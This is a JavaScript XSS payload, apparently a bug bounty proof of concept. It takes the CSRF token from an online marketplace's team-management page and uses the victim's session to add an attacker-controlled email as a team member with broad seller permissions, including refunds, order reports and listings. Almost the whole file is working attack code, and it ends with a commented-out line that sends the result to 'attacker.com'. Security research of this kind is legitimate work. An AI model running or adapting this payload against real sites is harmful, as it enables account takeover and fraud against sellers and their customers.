// XSS Payload to Add Team Member via CSRF Token Extraction
(async function() {
    const attackerEmail = "naysser+2555@bugcrowdninja.com";
    const firstName = "naysser";
    const lastName = "leos";
    
    // Step 1: Fetch the add-member page to extract the CSRF token (srt)
    try {
        const response = await fetch('/teamxs/member/add-member', {
            method: 'GET',
            credentials: 'include'
        });
        
        const html = await response.text();
        
        // Step 2: Extract the srt token from the page source
        // Pattern matches the srt value in the concat JSON structure
        const srtMatch = html.match(/"srt"\s*:\s*"([a-f0-9]+)"/);
        
        if (!srtMatch || !srtMatch[1]) {
            console.error('Failed to extract SRT token');
            return;
        }
        
        const srtToken = srtMatch[1];
        console.log('Extracted SRT token:', srtToken);
        
        // Step 3: Build the payload with permissions
        const payload = {
            permissionList: [
                { permissionId: "5000000002", permissionName: "Publish and revise listings", permissionNameSpace: "PERMISSION" },
                { permissionId: "5000000001", permissionName: "Create and edit drafts", permissionNameSpace: "PERMISSION" },
                { permissionId: "5000000009", permissionName: "Manage refunds, requests and disputes", permissionNameSpace: "PERMISSION" },
                { permissionId: "5000000006", permissionName: "Download order report", permissionNameSpace: "PERMISSION" },
                { permissionId: "5000000008", permissionName: "Print shipping labels", permissionNameSpace: "PERMISSION" },
                { permissionId: "5000000007", permissionName: "Add shipping tracking", permissionNameSpace: "PERMISSION" },
                { permissionId: "5000000005", permissionName: "View orders", permissionNameSpace: "PERMISSION" },
                { permissionId: "5000000012", permissionName: "Manage member to member messages", permissionNameSpace: "PERMISSION" },
                { permissionId: "5000000010", permissionName: "Create and manage discounts, buyer groups", permissionNameSpace: "PERMISSION" },
                { permissionId: "5000000011", permissionName: "Create and manage advertising campaigns", permissionNameSpace: "PERMISSION" },
                { permissionId: "5000000004", permissionName: "Research products using Terapeak", permissionNameSpace: "PERMISSION" }
            ],
            firstName: firstName,
            lastName: lastName,
            email: attackerEmail,
            message: "good"
        };
        
        // Step 4: Send the add-member request with extracted CSRF token
        const addMemberResponse = await fetch(`/teamxs/member/add-member?srt=${srtToken}`, {
            method: 'POST',
            credentials: 'include',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json, text/plain, */*'
            },
            body: JSON.stringify(payload)
        });
        
        const result = await addMemberResponse.json();
        console.log('Add member result:', result);
        
        // Optional: Exfiltrate result to attacker server
        // new Image().src = 'https://attacker.com/log?result=' + encodeURIComponent(JSON.stringify(result));
        
    } catch (error) {
        console.error('Error:', error);
    }
})();
